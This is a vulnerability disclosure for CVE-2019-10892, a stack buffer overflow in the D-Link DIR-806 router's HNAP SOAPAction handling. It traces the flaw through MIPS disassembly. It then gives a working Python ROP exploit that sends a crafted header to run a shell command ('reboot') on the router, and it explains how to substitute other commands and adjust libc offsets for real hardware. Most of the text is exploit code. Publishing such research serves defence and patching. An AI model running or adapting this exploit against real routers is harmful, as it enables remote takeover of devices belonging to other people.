# DIR-806_Stack Overflow to Run Shellcode

**CVE-2019-10892**

The fireware is the lasted version of DIR-806 in DLINK website：
```
http://support.dlink.com.cn/ProductInfo.aspx?m=DIR-806 
```
## Vulnerability Analyze
just like the start of:
```
https://github.com/Kirin-say/Vulnerabilities/blob/master/DIR-806_Code_Injection.md
```
When the router get the request of HNAP, it will call the hnap_main() function in /htdocs/cgibin,then it get SOAPAction by getenv :
```
.text:00411FAC                 la      $a0, aHttp_authoriza  # "HTTP_AUTHORIZATION"
.text:00411FB0                 lui     $a0, 0x42  # 'B'
.text:00411FB4                 lw      $gp, 0x248+var_230($sp)
.text:00411FB8                 la      $a0, aHttp_soapactio  # "HTTP_SOAPACTION"
.text:00411FBC                 la      $t9, getenv
.text:00411FC0                 jalr    $t9 ; getenv
.text:00411FC4                 move    $s2, $v0
.text:00411FC8                 lui     $a0, 0x42  # 'B'
.text:00411FCC                 lw      $gp, 0x248+var_230($sp)
.text:00411FD0                 la      $a0, aRequest_method  # "REQUEST_METHOD"
.text:00411FD4                 la      $t9, getenv
```
then it will check the SOAPAction start with `http://purenetworks.com/HNAP1/GetDeviceSettings`:
```
.text:00411FF0                 la      $t9, strstr
.text:00411FF4                 la      $a1, aHttpPurenetwor  # "http://purenetworks.com/HNAP1/GetDevice"...
.text:00411FF8                 jalr    $t9 ; strstr
.text:00411FFC                 move    $a0, $s0         # haystack
.text:00412000                 lw      $gp, 0x248+var_230($sp)
.text:00412004                 bnez    $v0, loc_412044
```
then the function will get the string in SOAPAction that after the right "/" by strrchr:
```
.text:00412044                 la      $t9, strrchr
.text:00412048                 move    $a0, $s0         # s
.text:0041204C                 jalr    $t9 ; strrchr
.text:00412050                 li      $a1, 0x2F  # '/'  # c
.text:00412054                 lw      $gp, 0x248+var_230($sp)
.text:00412058                 bnez    $v0, loc_412080
```
then it will call the sprintf function but it won't check the length of the strings that it got by strrchr,and it store it in the stack:
```
.text:00412430                 lui     $a1, 0x42  # 'B'
.text:00412434                 move    $a0, $s4         # s
.text:00412438                 addiu   $a2, (aVarRun_0 - 0x420000)  # "/var/run/"
.text:0041243C                 la      $a1, aShSS_shDevCo_0  # "sh %s%s.sh > /dev/console &"
.text:00412440
.text:00412440 loc_412440:                              # CODE XREF: hnap_main+4D8↑j
.text:00412440                 jalr    $t9 ; sprintf
```
so that we can overflow the $s0-s7 and $ra when hnap_main return:
```
.text:004124C4                 lw      $ra, 0x248+var_4($sp)
.text:004124C8                 lw      $s7, 0x248+var_8($sp)
.text:004124CC                 lw      $s6, 0x248+var_C($sp)
.text:004124D0                 lw      $s5, 0x248+var_10($sp)
.text:004124D4                 lw      $s4, 0x248+var_14($sp)
.text:004124D8                 lw      $s3, 0x248+var_18($sp)
.text:004124DC                 lw      $s2, 0x248+var_1C($sp)
.text:004124E0                 lw      $s1, 0x248+var_20($sp)
.text:004124E4                 lw      $s0, 0x248+var_24($sp)
.text:004124E8                 jr      $ra
.text:004124EC                 addiu   $sp, 0x248
```
If we make a rop chain in stack,it will finally call the system(our cmd)
## POC
```
from pwn import *
import requests
import sys
def get_payload():
  cmd="reboot;".ljust(30,"a")
  libc_addr=0x7679BA60-0x002aa60
  payload="http://purenetworks.com/HNAP1/GetDeviceSettings/"
  payload+="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"  
  payload+="aaaa"*6
  payload+=p32(libc_addr+0x003E204)[::-1]#s6
  payload+=p32(libc_addr+0x052510)[::-1]#s7
  payload+=p32(libc_addr+0x0F5B4)[::-1]#ra->get cmd in s4->jar s6
  payload+="aaaa"*4
  payload+=cmd
  return payload
data="<?xml version=\"1.0\" encoding=\"UTF-8\"?>\
<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\" soap:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\
  <soap:Body>\
    <GetWanSettings xmlns=\"http://purenetworks.com/HNAP1/\">\
    </GetWanSettings>\
  </soap:Body>\
</soap:Envelope>"

if __name__=="__main__":
    fake_cmd=get_payload()
    header = {
        'SOAPAction' : fake_cmd,
        'Cookie'        : "uid=LS32Srlx8N",
        'Content-Type'  : 'text/xml',
        'Content-Length': str(len(data))
        }
    url="http://192.168.0.1/HNAP1/"
    r=requests.post(url=url,headers=header,data=data)
    log.info("Kirin-say PWN")
```
you can also edit the cmd to run different shell,but you should also edit the libc_addr because I write this POC by qemu,so you should edit offset of libc.so.0 in real environment.
 For example(the router reboot successfully) 
![Success](https://upload-images.jianshu.io/upload_images/7434375-a0bda011a271ec24.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
